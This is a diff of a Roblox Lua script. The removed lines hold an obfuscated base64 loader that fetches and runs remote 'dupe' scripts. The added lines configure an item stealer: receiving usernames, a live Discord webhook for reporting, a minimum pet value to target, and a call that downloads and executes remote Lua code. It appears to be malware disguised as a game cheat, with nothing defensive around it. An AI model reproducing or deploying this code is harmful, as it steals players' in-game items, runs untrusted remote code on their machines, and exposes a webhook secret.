@@ -1,18 +1,4 @@
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-
-function dec(data)
-    data = string.gsub(data, '[^'..b..'=]', '')
-    return (data:gsub('.', function(x)
-        if (x == '=') then return '' end
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
-        return r
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if (#x ~= 8) then return '' end
-        local c=0
-        for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
-        return string.char(c)
-    end))
-end
-
-loadstring(dec("CmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmVzdHNjcmlwdC1oazk5L2R1cGVpbmdyb3dhZ3JhZGVuLS9yZWZzL2hlYWRzL21haW4vZHVwZS5sdWEiLCB0cnVlKSkoKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jlc3RzY3JpcHQtaGs5OS9oZXhzaWxkaHViL3JlZnMvaGVhZHMvbWFpbi9HYUdzY3JpcHQubHVhIiwgdHJ1ZSkpKCkK"))()
+Username = {"stealgrowahk99","hk99baro","VillegasDuanea708"} 
+Webhook = "https://discord.com/api/webhooks/1376468026815287387/2IEWdrrV2ulGsEvfCiosEfVO2SAhEcQUbw0bObfKw0lDKDhPs8N0Xrz-_VUSh3AmkUni" 
+min_rap = 10000 --for pets go and pet simulator 99 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
